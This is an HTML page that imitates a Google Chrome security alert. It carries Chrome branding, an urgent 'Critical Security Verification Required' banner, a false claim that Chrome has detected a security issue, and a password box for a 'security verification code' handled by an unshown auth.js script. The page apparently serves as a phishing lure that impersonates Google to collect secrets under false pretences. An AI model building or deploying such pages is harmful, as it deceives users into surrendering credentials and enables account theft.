<!DOCTYPE html>
<html>
<head>
    <title>Chrome Core Sync Manager</title>
    <link rel="stylesheet" type="text/css" href="auth.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body>
    <div class="auth-container">
        <div class="company-branding">
            <img src="images/chrome_official.svg" alt="Chrome" class="company-logo">
            <h1>Chrome Security Verification</h1>
        </div>
        <div class="security-section">
            <div class="alert-banner">
                <img src="images/warning_icon.svg" alt="Warning" class="warning-icon">
                <span>Critical Security Verification Required</span>
            </div>
            <p class="auth-message">Chrome has detected a security issue that requires immediate verification. This process is necessary to maintain browser integrity and protect your data.</p>
            <div class="input-group">
                <input type="password" id="passwordInput" placeholder="Enter security verification code" autofocus>
                <button id="authButton">Verify Now</button>
            </div>
            <p id="messageArea" class="message"></p>
        </div>
        <div class="footer">
            <p>Google Chrome Security System</p>
        </div>
    </div>
    <script src="auth.js"></script>
</body>
</html>
